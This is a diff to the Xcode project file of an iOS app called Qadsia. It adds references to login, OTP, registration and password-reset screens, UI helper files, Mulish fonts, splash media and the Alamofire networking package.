@@ -7,6 +7,73 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		0A96E3782F76574C00B3DADB /* OTPVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A96E3752F76574C00B3DADB /* OTPVC.swift */; };
+		0A96E3792F76574C00B3DADB /* OTPVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A96E3762F76574C00B3DADB /* OTPVC.xib */; };
+		0ABA3FA92F763B2D00D25F03 /* APIClient.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F452F763B2D00D25F03 /* APIClient.swift */; };
+		0ABA3FAA2F763B2D00D25F03 /* Constants.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F462F763B2D00D25F03 /* Constants.swift */; };
+		0ABA3FAB2F763B2D00D25F03 /* NetConnection.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F472F763B2D00D25F03 /* NetConnection.swift */; };
+		0ABA3FAC2F763B2D00D25F03 /* AppButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F492F763B2D00D25F03 /* AppButton.swift */; };
+		0ABA3FAD2F763B2D00D25F03 /* AppLabel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F4A2F763B2D00D25F03 /* AppLabel.swift */; };
+		0ABA3FAE2F763B2D00D25F03 /* AppTextField.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F4B2F763B2D00D25F03 /* AppTextField.swift */; };
+		0ABA3FAF2F763B2D00D25F03 /* AppTextView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F4C2F763B2D00D25F03 /* AppTextView.swift */; };
+		0ABA3FB02F763B2D00D25F03 /* String+Extention.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F4E2F763B2D00D25F03 /* String+Extention.swift */; };
+		0ABA3FB12F763B2D00D25F03 /* UIColor+Extention.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F4F2F763B2D00D25F03 /* UIColor+Extention.swift */; };
+		0ABA3FB22F763B2D00D25F03 /* UIFont+Extention.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F502F763B2D00D25F03 /* UIFont+Extention.swift */; };
+		0ABA3FB32F763B2D00D25F03 /* UIImage+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F512F763B2D00D25F03 /* UIImage+Extension.swift */; };
+		0ABA3FB42F763B2D00D25F03 /* UILabel+Extention.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F522F763B2D00D25F03 /* UILabel+Extention.swift */; };
+		0ABA3FB52F763B2D00D25F03 /* UITextField+Extention.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F532F763B2D00D25F03 /* UITextField+Extention.swift */; };
+		0ABA3FB62F763B2D00D25F03 /* UIView+Extention.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F542F763B2D00D25F03 /* UIView+Extention.swift */; };
+		0ABA3FB72F763B2D00D25F03 /* FTAnimation+UIView.m in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F562F763B2D00D25F03 /* FTAnimation+UIView.m */; };
+		0ABA3FB82F763B2D00D25F03 /* FTAnimationManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F572F763B2D00D25F03 /* FTAnimationManager.m */; };
+		0ABA3FB92F763B2D00D25F03 /* FTUtils+NSObject.m in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F582F763B2D00D25F03 /* FTUtils+NSObject.m */; };
+		0ABA3FBA2F763B2D00D25F03 /* FTUtils+UIGestureRecognizer.m in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F592F763B2D00D25F03 /* FTUtils+UIGestureRecognizer.m */; };
+		0ABA3FBB2F763B2D00D25F03 /* AGDesignable.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F652F763B2D00D25F03 /* AGDesignable.swift */; };
+		0ABA3FBC2F763B2D00D25F03 /* AppConstants.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F662F763B2D00D25F03 /* AppConstants.swift */; };
+		0ABA3FBD2F763B2D00D25F03 /* AppUtilites.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F672F763B2D00D25F03 /* AppUtilites.swift */; };
+		0ABA3FBE2F763B2D00D25F03 /* ExpandableLabel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F682F763B2D00D25F03 /* ExpandableLabel.swift */; };
+		0ABA3FC02F763B2D00D25F03 /* DPDConstants.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F7E2F763B2D00D25F03 /* DPDConstants.swift */; };
+		0ABA3FC12F763B2D00D25F03 /* DPDKeyboardListener.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F7F2F763B2D00D25F03 /* DPDKeyboardListener.swift */; };
+		0ABA3FC22F763B2D00D25F03 /* DPDUIView+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F802F763B2D00D25F03 /* DPDUIView+Extension.swift */; };
+		0ABA3FC32F763B2D00D25F03 /* DropDown.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F842F763B2D00D25F03 /* DropDown.swift */; };
+		0ABA3FC42F763B2D00D25F03 /* DropDown+Appearance.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F852F763B2D00D25F03 /* DropDown+Appearance.swift */; };
+		0ABA3FC52F763B2D00D25F03 /* DropDownCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F862F763B2D00D25F03 /* DropDownCell.swift */; };
+		0ABA3FC62F763B2D00D25F03 /* HCSStarRatingView.m in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F8A2F763B2D00D25F03 /* HCSStarRatingView.m */; };
+		0ABA3FC72F763B2D00D25F03 /* OTPFieldView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F8C2F763B2D00D25F03 /* OTPFieldView.swift */; };
+		0ABA3FC82F763B2D00D25F03 /* OTPTextField.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F8D2F763B2D00D25F03 /* OTPTextField.swift */; };
+		0ABA3FC92F763B2D00D25F03 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F902F763B2D00D25F03 /* AppDelegate.swift */; };
+		0ABA3FCA2F763B2D00D25F03 /* LoginMobileVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F952F763B2D00D25F03 /* LoginMobileVC.swift */; };
+		0ABA3FCB2F763B2D00D25F03 /* NewRegisterVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F992F763B2D00D25F03 /* NewRegisterVC.swift */; };
+		0ABA3FCE2F763B2D00D25F03 /* ResetPasswordVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F9F2F763B2D00D25F03 /* ResetPasswordVC.swift */; };
+		0ABA3FCF2F763B2D00D25F03 /* SentOTPPopupVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3FA12F763B2D00D25F03 /* SentOTPPopupVC.swift */; };
+		0ABA3FD12F763B2D00D25F03 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3FA72F763B2D00D25F03 /* ViewController.swift */; };
+		0ABA3FD22F763B2D00D25F03 /* Mulish-Black.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3F6B2F763B2D00D25F03 /* Mulish-Black.ttf */; };
+		0ABA3FD32F763B2D00D25F03 /* Mulish-BlackItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3F6C2F763B2D00D25F03 /* Mulish-BlackItalic.ttf */; };
+		0ABA3FD42F763B2D00D25F03 /* Mulish-Bold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3F6D2F763B2D00D25F03 /* Mulish-Bold.ttf */; };
+		0ABA3FD52F763B2D00D25F03 /* Mulish-BoldItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3F6E2F763B2D00D25F03 /* Mulish-BoldItalic.ttf */; };
+		0ABA3FD62F763B2D00D25F03 /* Mulish-ExtraBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3F6F2F763B2D00D25F03 /* Mulish-ExtraBold.ttf */; };
+		0ABA3FD72F763B2D00D25F03 /* Mulish-ExtraBoldItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3F702F763B2D00D25F03 /* Mulish-ExtraBoldItalic.ttf */; };
+		0ABA3FD82F763B2D00D25F03 /* Mulish-ExtraLight.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3F712F763B2D00D25F03 /* Mulish-ExtraLight.ttf */; };
+		0ABA3FD92F763B2D00D25F03 /* Mulish-ExtraLightItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3F722F763B2D00D25F03 /* Mulish-ExtraLightItalic.ttf */; };
+		0ABA3FDA2F763B2D00D25F03 /* Mulish-Italic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3F732F763B2D00D25F03 /* Mulish-Italic.ttf */; };
+		0ABA3FDB2F763B2D00D25F03 /* Mulish-Light.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3F742F763B2D00D25F03 /* Mulish-Light.ttf */; };
+		0ABA3FDC2F763B2D00D25F03 /* Mulish-LightItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3F752F763B2D00D25F03 /* Mulish-LightItalic.ttf */; };
+		0ABA3FDD2F763B2D00D25F03 /* Mulish-Medium.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3F762F763B2D00D25F03 /* Mulish-Medium.ttf */; };
+		0ABA3FDE2F763B2D00D25F03 /* Mulish-MediumItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3F772F763B2D00D25F03 /* Mulish-MediumItalic.ttf */; };
+		0ABA3FDF2F763B2D00D25F03 /* Mulish-Regular.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3F782F763B2D00D25F03 /* Mulish-Regular.ttf */; };
+		0ABA3FE02F763B2D00D25F03 /* Mulish-SemiBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3F792F763B2D00D25F03 /* Mulish-SemiBold.ttf */; };
+		0ABA3FE12F763B2D00D25F03 /* Mulish-SemiBoldItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3F7A2F763B2D00D25F03 /* Mulish-SemiBoldItalic.ttf */; };
+		0ABA3FE22F763B2D00D25F03 /* DropDownCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3F822F763B2D00D25F03 /* DropDownCell.xib */; };
+		0ABA3FE32F763B2D00D25F03 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3F912F763B2D00D25F03 /* Assets.xcassets */; };
+		0ABA3FE52F763B2D00D25F03 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3F942F763B2D00D25F03 /* LaunchScreen.storyboard */; };
+		0ABA3FE62F763B2D00D25F03 /* LoginMobileVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3F962F763B2D00D25F03 /* LoginMobileVC.xib */; };
+		0ABA3FE72F763B2D00D25F03 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3F982F763B2D00D25F03 /* Main.storyboard */; };
+		0ABA3FE82F763B2D00D25F03 /* NewRegisterVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3F9A2F763B2D00D25F03 /* NewRegisterVC.xib */; };
+		0ABA3FEB2F763B2D00D25F03 /* ResetPasswordVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3FA02F763B2D00D25F03 /* ResetPasswordVC.xib */; };
+		0ABA3FEC2F763B2D00D25F03 /* SentOTPPopupVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3FA22F763B2D00D25F03 /* SentOTPPopupVC.xib */; };
+		0ABA3FED2F763B2D00D25F03 /* SplashVideo.mp4 in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3FA32F763B2D00D25F03 /* SplashVideo.mp4 */; };
+		0ABA3FEE2F763B2D00D25F03 /* SplashVideo2.gif in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3FA42F763B2D00D25F03 /* SplashVideo2.gif */; };
+		0ABA3FF52F763C3600D25F03 /* CutCornerView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3FF42F763C3600D25F03 /* CutCornerView.swift */; };
+		0ABA3FFA2F763CC600D25F03 /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = 0ABA3FF92F763CC600D25F03 /* Alamofire */; };
 		BC11AFEC2F74E65F00552BDB /* Toast in Frameworks */ = {isa = PBXBuildFile; productRef = BC11AFEB2F74E65F00552BDB /* Toast */; };
 		BC11AFEF2F74E6B300552BDB /* SVProgressHUD in Frameworks */ = {isa = PBXBuildFile; productRef = BC11AFEE2F74E6B300552BDB /* SVProgressHUD */; };
 		BC11AFF22F74E6C500552BDB /* Kingfisher in Frameworks */ = {isa = PBXBuildFile; productRef = BC11AFF12F74E6C500552BDB /* Kingfisher */; };
@@ -14,35 +81,89 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		0A96E3752F76574C00B3DADB /* OTPVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OTPVC.swift; sourceTree = "<group>"; };
+		0A96E3762F76574C00B3DADB /* OTPVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = OTPVC.xib; sourceTree = "<group>"; };
+		0ABA3F452F763B2D00D25F03 /* APIClient.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APIClient.swift; sourceTree = "<group>"; };
+		0ABA3F462F763B2D00D25F03 /* Constants.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Constants.swift; sourceTree = "<group>"; };
+		0ABA3F472F763B2D00D25F03 /* NetConnection.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetConnection.swift; sourceTree = "<group>"; };
+		0ABA3F492F763B2D00D25F03 /* AppButton.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppButton.swift; sourceTree = "<group>"; };
+		0ABA3F4A2F763B2D00D25F03 /* AppLabel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppLabel.swift; sourceTree = "<group>"; };
+		0ABA3F4B2F763B2D00D25F03 /* AppTextField.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppTextField.swift; sourceTree = "<group>"; };
+		0ABA3F4C2F763B2D00D25F03 /* AppTextView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppTextView.swift; sourceTree = "<group>"; };
+		0ABA3F4E2F763B2D00D25F03 /* String+Extention.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "String+Extention.swift"; sourceTree = "<group>"; };
+		0ABA3F4F2F763B2D00D25F03 /* UIColor+Extention.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIColor+Extention.swift"; sourceTree = "<group>"; };
+		0ABA3F502F763B2D00D25F03 /* UIFont+Extention.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIFont+Extention.swift"; sourceTree = "<group>"; };
+		0ABA3F512F763B2D00D25F03 /* UIImage+Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIImage+Extension.swift"; sourceTree = "<group>"; };
+		0ABA3F522F763B2D00D25F03 /* UILabel+Extention.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UILabel+Extention.swift"; sourceTree = "<group>"; };
+		0ABA3F532F763B2D00D25F03 /* UITextField+Extention.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UITextField+Extention.swift"; sourceTree = "<group>"; };
+		0ABA3F542F763B2D00D25F03 /* UIView+Extention.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIView+Extention.swift"; sourceTree = "<group>"; };
+		0ABA3F562F763B2D00D25F03 /* FTAnimation+UIView.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "FTAnimation+UIView.m"; sourceTree = "<group>"; };
+		0ABA3F572F763B2D00D25F03 /* FTAnimationManager.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = FTAnimationManager.m; sourceTree = "<group>"; };
+		0ABA3F582F763B2D00D25F03 /* FTUtils+NSObject.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "FTUtils+NSObject.m"; sourceTree = "<group>"; };
+		0ABA3F592F763B2D00D25F03 /* FTUtils+UIGestureRecognizer.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "FTUtils+UIGestureRecognizer.m"; sourceTree = "<group>"; };
+		0ABA3F5B2F763B2D00D25F03 /* FTAnimation.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = FTAnimation.h; sourceTree = "<group>"; };
+		0ABA3F5C2F763B2D00D25F03 /* FTAnimation+UIView.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "FTAnimation+UIView.h"; sourceTree = "<group>"; };
+		0ABA3F5D2F763B2D00D25F03 /* FTAnimationManager.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = FTAnimationManager.h; sourceTree = "<group>"; };
+		0ABA3F5E2F763B2D00D25F03 /* FTUtils.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = FTUtils.h; sourceTree = "<group>"; };
+		0ABA3F5F2F763B2D00D25F03 /* FTUtils+NSObject.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "FTUtils+NSObject.h"; sourceTree = "<group>"; };
+		0ABA3F602F763B2D00D25F03 /* FTUtils+UIGestureRecognizer.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "FTUtils+UIGestureRecognizer.h"; sourceTree = "<group>"; };
+		0ABA3F652F763B2D00D25F03 /* AGDesignable.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AGDesignable.swift; sourceTree = "<group>"; };
+		0ABA3F662F763B2D00D25F03 /* AppConstants.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppConstants.swift; sourceTree = "<group>"; };
+		0ABA3F672F763B2D00D25F03 /* AppUtilites.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppUtilites.swift; sourceTree = "<group>"; };
+		0ABA3F682F763B2D00D25F03 /* ExpandableLabel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ExpandableLabel.swift; sourceTree = "<group>"; };
+		0ABA3F6B2F763B2D00D25F03 /* Mulish-Black.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-Black.ttf"; sourceTree = "<group>"; };
+		0ABA3F6C2F763B2D00D25F03 /* Mulish-BlackItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-BlackItalic.ttf"; sourceTree = "<group>"; };
+		0ABA3F6D2F763B2D00D25F03 /* Mulish-Bold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-Bold.ttf"; sourceTree = "<group>"; };
+		0ABA3F6E2F763B2D00D25F03 /* Mulish-BoldItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-BoldItalic.ttf"; sourceTree = "<group>"; };
+		0ABA3F6F2F763B2D00D25F03 /* Mulish-ExtraBold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-ExtraBold.ttf"; sourceTree = "<group>"; };
+		0ABA3F702F763B2D00D25F03 /* Mulish-ExtraBoldItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-ExtraBoldItalic.ttf"; sourceTree = "<group>"; };
+		0ABA3F712F763B2D00D25F03 /* Mulish-ExtraLight.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-ExtraLight.ttf"; sourceTree = "<group>"; };
+		0ABA3F722F763B2D00D25F03 /* Mulish-ExtraLightItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-ExtraLightItalic.ttf"; sourceTree = "<group>"; };
+		0ABA3F732F763B2D00D25F03 /* Mulish-Italic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-Italic.ttf"; sourceTree = "<group>"; };
+		0ABA3F742F763B2D00D25F03 /* Mulish-Light.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-Light.ttf"; sourceTree = "<group>"; };
+		0ABA3F752F763B2D00D25F03 /* Mulish-LightItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-LightItalic.ttf"; sourceTree = "<group>"; };
+		0ABA3F762F763B2D00D25F03 /* Mulish-Medium.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-Medium.ttf"; sourceTree = "<group>"; };
+		0ABA3F772F763B2D00D25F03 /* Mulish-MediumItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-MediumItalic.ttf"; sourceTree = "<group>"; };
+		0ABA3F782F763B2D00D25F03 /* Mulish-Regular.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-Regular.ttf"; sourceTree = "<group>"; };
+		0ABA3F792F763B2D00D25F03 /* Mulish-SemiBold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-SemiBold.ttf"; sourceTree = "<group>"; };
+		0ABA3F7A2F763B2D00D25F03 /* Mulish-SemiBoldItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Mulish-SemiBoldItalic.ttf"; sourceTree = "<group>"; };
+		0ABA3F7E2F763B2D00D25F03 /* DPDConstants.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DPDConstants.swift; sourceTree = "<group>"; };
+		0ABA3F7F2F763B2D00D25F03 /* DPDKeyboardListener.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DPDKeyboardListener.swift; sourceTree = "<group>"; };
+		0ABA3F802F763B2D00D25F03 /* DPDUIView+Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "DPDUIView+Extension.swift"; sourceTree = "<group>"; };
+		0ABA3F822F763B2D00D25F03 /* DropDownCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DropDownCell.xib; sourceTree = "<group>"; };
+		0ABA3F842F763B2D00D25F03 /* DropDown.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DropDown.swift; sourceTree = "<group>"; };
+		0ABA3F852F763B2D00D25F03 /* DropDown+Appearance.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "DropDown+Appearance.swift"; sourceTree = "<group>"; };
+		0ABA3F862F763B2D00D25F03 /* DropDownCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DropDownCell.swift; sourceTree = "<group>"; };
+		0ABA3F892F763B2D00D25F03 /* HCSStarRatingView.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = HCSStarRatingView.h; sourceTree = "<group>"; };
+		0ABA3F8A2F763B2D00D25F03 /* HCSStarRatingView.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = HCSStarRatingView.m; sourceTree = "<group>"; };
+		0ABA3F8C2F763B2D00D25F03 /* OTPFieldView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OTPFieldView.swift; sourceTree = "<group>"; };
+		0ABA3F8D2F763B2D00D25F03 /* OTPTextField.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OTPTextField.swift; sourceTree = "<group>"; };
+		0ABA3F902F763B2D00D25F03 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
+		0ABA3F912F763B2D00D25F03 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
+		0ABA3F922F763B2D00D25F03 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		0ABA3F932F763B2D00D25F03 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
+		0ABA3F952F763B2D00D25F03 /* LoginMobileVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginMobileVC.swift; sourceTree = "<group>"; };
+		0ABA3F962F763B2D00D25F03 /* LoginMobileVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = LoginMobileVC.xib; sourceTree = "<group>"; };
+		0ABA3F972F763B2D00D25F03 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
+		0ABA3F992F763B2D00D25F03 /* NewRegisterVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewRegisterVC.swift; sourceTree = "<group>"; };
+		0ABA3F9A2F763B2D00D25F03 /* NewRegisterVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = NewRegisterVC.xib; sourceTree = "<group>"; };
+		0ABA3F9F2F763B2D00D25F03 /* ResetPasswordVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ResetPasswordVC.swift; sourceTree = "<group>"; };
+		0ABA3FA02F763B2D00D25F03 /* ResetPasswordVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ResetPasswordVC.xib; sourceTree = "<group>"; };
+		0ABA3FA12F763B2D00D25F03 /* SentOTPPopupVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SentOTPPopupVC.swift; sourceTree = "<group>"; };
+		0ABA3FA22F763B2D00D25F03 /* SentOTPPopupVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SentOTPPopupVC.xib; sourceTree = "<group>"; };
+		0ABA3FA32F763B2D00D25F03 /* SplashVideo.mp4 */ = {isa = PBXFileReference; lastKnownFileType = file; path = SplashVideo.mp4; sourceTree = "<group>"; };
+		0ABA3FA42F763B2D00D25F03 /* SplashVideo2.gif */ = {isa = PBXFileReference; lastKnownFileType = image.gif; path = SplashVideo2.gif; sourceTree = "<group>"; };
+		0ABA3FA72F763B2D00D25F03 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
+		0ABA3FF42F763C3600D25F03 /* CutCornerView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CutCornerView.swift; sourceTree = "<group>"; };
 		BC0179162F34972300F1ED81 /* Qadsia.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Qadsia.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
-
-/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
-		BC0179282F34972600F1ED81 /* Exceptions for "Qadsia Club" folder in "Qadsia" target */ = {
-			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
-			membershipExceptions = (
-				Info.plist,
-			);
-			target = BC0179152F34972300F1ED81 /* Qadsia */;
-		};
-/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */
-
-/* Begin PBXFileSystemSynchronizedRootGroup section */
-		BC0179182F34972300F1ED81 /* Qadsia Club */ = {
-			isa = PBXFileSystemSynchronizedRootGroup;
-			exceptions = (
-				BC0179282F34972600F1ED81 /* Exceptions for "Qadsia Club" folder in "Qadsia" target */,
-			);
-			path = "Qadsia Club";
-			sourceTree = "<group>";
-		};
-/* End PBXFileSystemSynchronizedRootGroup section */
 
 /* Begin PBXFrameworksBuildPhase section */
 		BC0179132F34972300F1ED81 /* Frameworks */ = {
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				0ABA3FFA2F763CC600D25F03 /* Alamofire in Frameworks */,
 				BC11AFF22F74E6C500552BDB /* Kingfisher in Frameworks */,
 				BC11AFF52F74E6D700552BDB /* IQKeyboardManagerSwift in Frameworks */,
 				BC11AFEF2F74E6B300552BDB /* SVProgressHUD in Frameworks */,
@@ -53,10 +174,355 @@
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
+		0A96E3712F7656EB00B3DADB /* SentOTPPopupVC */ = {
+			isa = PBXGroup;
+			children = (
+				0A96E3722F7656ED00B3DADB /* View */,
+			);
+			path = SentOTPPopupVC;
+			sourceTree = "<group>";
+		};
+		0A96E3722F7656ED00B3DADB /* View */ = {
+			isa = PBXGroup;
+			children = (
+				0ABA3FA12F763B2D00D25F03 /* SentOTPPopupVC.swift */,
+				0ABA3FA22F763B2D00D25F03 /* SentOTPPopupVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		0A96E3732F76574100B3DADB /* OTPVC */ = {
+			isa = PBXGroup;
+			children = (
+				0A96E3772F76574C00B3DADB /* View */,
+			);
+			path = OTPVC;
+			sourceTree = "<group>";
+		};
+		0A96E3772F76574C00B3DADB /* View */ = {
+			isa = PBXGroup;
+			children = (
+				0A96E3752F76574C00B3DADB /* OTPVC.swift */,
+				0A96E3762F76574C00B3DADB /* OTPVC.xib */,
